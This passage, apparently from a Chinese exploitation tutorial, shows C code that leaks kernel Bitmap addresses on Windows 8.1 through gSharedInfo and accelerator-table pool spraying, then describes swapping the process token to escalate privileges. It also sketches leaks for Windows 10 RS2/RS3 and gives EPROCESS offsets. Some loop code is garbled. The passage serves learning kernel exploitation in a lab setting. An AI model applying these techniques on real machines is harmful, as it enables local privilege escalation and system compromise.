    } SHAREDINFO, * PSHAREDINFO;
其中的 `aheList` 结构如下，里面就保存了一个 pKernel 的指针，指向这个句柄的内核地址
    typedef struct _USER_HANDLE_ENTRY {
        void* pKernel;
        union
        {
            PVOID pi;
            PVOID pti;
            PVOID ppi;
        };
        BYTE type;
        BYTE flags;
        WORD generation;
    } USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;
先不管三七二十一，我们先泄露这个东西，再看看和我们的 Bitmap 有什么联系，关键代码如下
    LPACCEL lPaccel = NULL;
    PUSER_HANDLE_ENTRY leakaddr = NULL;
    HMODULE huser32 = NULL;
    HACCEL hAccel = NULL;
    int nSize = 700;
    lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * nSize);
    PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(
        GetModuleHandleW(L"user32.dll"), 
        "gSharedInfo");
    PUSER_HANDLE_ENTRY handleTable = pfindSharedInfo->aheList;
    for (int i = 0; i pKernel);
        printf("[+]leak address : 0x%p", leakaddr->pKernel);
        DestroyAcceleratorTable(hAccel);
        if(i = 3)
        {
            CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL);
        }
    }
运行一下查看结果，确实泄露了什么东西出来
解读一下上面的代码，我们首先创建了一块内存，其中的nSize选择了700的大小，因为后面我们使用`CreateBitmap`创建的对象传入的第一个参数是0x710，关于`CreateBitmap`中第一个参数`width`对生成对象的影响我就不过多阐述了，实验加上[官方文档](https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createbitmap)可以给我们解释，然后我们获取了 user32.dll
中的 gSharedInfo 对象，我们在一个循环里使用 CreateAcceleratorTable 和 DestroyAcceleratorTable
不断创建释放了 hAccel 结构，其中计算的过程和我们泄露bitmap地址的过程类似，这里就会产生一个疑问，这个泄露的东西为什么和我们的 Bitmap
一样呢，要知道我们每次创建释放hAccel时候地址是固定的(你可以多打印几次进行实验)，并且这个对象也是分配在会话池(sesssion
pool)，大小又相等，池类型又相同，如果我们申请了一块然后释放了，再用bitmap申请岂不是就可以申请到我们想要的地方，泄露的地址也就是bitmap的地址了，我们这里为了使得到的地址固定，堆喷射后使用了一个判断语句判断是否得到了稳定的地址，得到之后我们再加上相应的偏移也就是我们的
PrvScan0 了，于是我们构造如下代码片段
    LeakBitmapInfo GetBitmap()
    {
        UINT loadCount = 0;
        HACCEL hAccel = NULL;
        LPACCEL lPaccel = NULL;
        PUSER_HANDLE_ENTRY firstEntryAddr = NULL;
        PUSER_HANDLE_ENTRY secondEntryAddr = NULL;
        int nSize = 700;
        int handleIndex = 0;
        PUCHAR firstAccelKernelAddr;
        PUCHAR secondAccelKernelAddr;
        PSHAREDINFO pfindSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");   // 获取gSharedInfo表
        PUSER_HANDLE_ENTRY gHandleTable = pfindSharedInfo->aheList;
        LeakBitmapInfo retBitmap;
        lPaccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * nSize);
        while (loadCount pKernel;
            DestroyAcceleratorTable(hAccel);
            hAccel = CreateAcceleratorTable(lPaccel, nSize);    
            handleIndex = LOWORD(hAccel);
            secondEntryAddr = &gHandleTable[handleIndex];
            secondAccelKernelAddr = (PUCHAR)firstEntryAddr->pKernel;
            if (firstAccelKernelAddr == secondAccelKernelAddr)
            {
                DestroyAcceleratorTable(hAccel);
                LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                retBitmap.hBitmap = CreateBitmap(0x701, 2, 1, 8, lpBuf); 
                break;
            }
            DestroyAcceleratorTable(hAccel);
            loadCount++;
        }
        retBitmap.pBitmapPvScan0 = firstAccelKernelAddr + 0x50;
        printf("[+]bitmap handle is:  0x%08x \n", (ULONG)retBitmap.hBitmap);
        printf("[+]bitmap pvScan0 at: 0x%p \n\n", retBitmap.pBitmapPvScan0);
        return retBitmap;
    }
泄露了之后就好办了，也就是只需要替换一个token就行了，我这里用的是read和write函数不断的进行汇编shellcode的模仿，在ring3层实现了对token的替换，这样我们就可以不加入我们的shellcode从而提权，而这种方法也不需要考虑堆栈平衡，非常的方便，其中获取系统的一些信息的时候使用了`NtQuerySystemInformation`这个函数，通过它可以给我们提供很多的系统信息，具体的可以参阅[官方文档](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation)
    __kernel_entry NTSTATUS NtQuerySystemInformation(
      IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
      OUT PVOID                   SystemInformation,
      IN ULONG                    SystemInformationLength,
      OUT PULONG                  ReturnLength
    );
最后整合一下思路：
  * 初始化句柄等结构
  * 通过`gSharedInfo`对象来泄露我们的Bitmap地址
  * 调用`TriggerArbitraryOverwrite`函数将一个pvScan0指向另一个pvScan0
  * 通过不断的read和write，模拟token的替换，从而提权
最后整合一下代码即可实现利用，整体代码和验证结果参考 => [这里](https://github.com/ThunderJie/Write-What-Where)
# 0x03：Windows 10 后续版本的猜想
## RS2
RS2版本中貌似将我们的 pkernel 指针给移除了，也就是说我们不能再通过 gSharedInfo
结构来泄露我们的内核地址了，不过有前辈们用`tagCLS`对象及`lpszMenuName`对象泄露了内核地址，能够泄露的话其实其他地方都好办了，泄露的方法我这里简单提一下，首先我们需要找到`HMValidateHandle`函数的地址，这个函数我们只需要传入一个窗口句柄，他就会返回在桌面堆中的`tagWND`对象指针，而通过这个指针我们就可以泄露出内核地址，这个函数地址我们可以通过`IsMenu`这个用户态函数获取到，我们来看一下函数的内容，可以看到
call 之后会调用到`HMValidateHandle`这个函数，那么我们只需要通过硬编码计算，获取 e8(call) 之后的几个字节地址就行了
    kd> u user32!IsMenu
    USER32!IsMenu:
    00007fff`17d489e0 4883ec28        sub     rsp,28h
    00007fff`17d489e4 b202            mov     dl,2
    00007fff`17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff`17d4c1f0)
    00007fff`17d489eb 33c9            xor     ecx,ecx
    00007fff`17d489ed 4885c0          test    rax,rax
    00007fff`17d489f0 0f95c1          setne   cl
    00007fff`17d489f3 8bc1            mov     eax,ecx
    00007fff`17d489f5 4883c428        add     rsp,28h
获取到`HMValidateHandle`函数之后我们只需要再进行一系列的计算获取`lpszMenuName`对象的地址，我们可以依据下图 Morten
所说的计算过程计算出`Client delta`
获取到了之后我们只需要和前面一样进行堆喷加上判断就能够泄露出Bitmap的地址，还需要注意的是偏移的问题，需要简要修改，下面是1703的一些偏移
    2: kd> dt nt!_EPROCESS uniqueprocessid token activeprocesslinks
       +0x2e0 UniqueProcessId    : Ptr64 Void
       +0x2e8 ActiveProcessLinks : _LIST_ENTRY
       +0x358 Token              : _EX_FAST_REF
## RS3
RS3版本中 PvScan0 已经放进了堆中，既然是堆的话，又让人想到了堆喷射控制内核池，总之可以尝试一下这种方法
但是前辈们总有奇特的想法，又找到了另外一个对象 platte ，它类似与 bitmap 结构，可以用 `CreatePalette` 函数创建，结构如下
任意读写的方法只是改为了`GetPaletteEntries`和`SetPaletteEntries`，以后可以尝试一下这个思路
# 0x03：后记
利用里面，win8.1的坑比较多，和win7比起来差距有点大，需要细心调试，更往后的版本主要是参阅外国的文献，以后有时间再来实践
参考资料：
[+] 参阅过的pdf：
[+] RS2上的利用分析：
[+] RS3上 platte 对象的利用分析：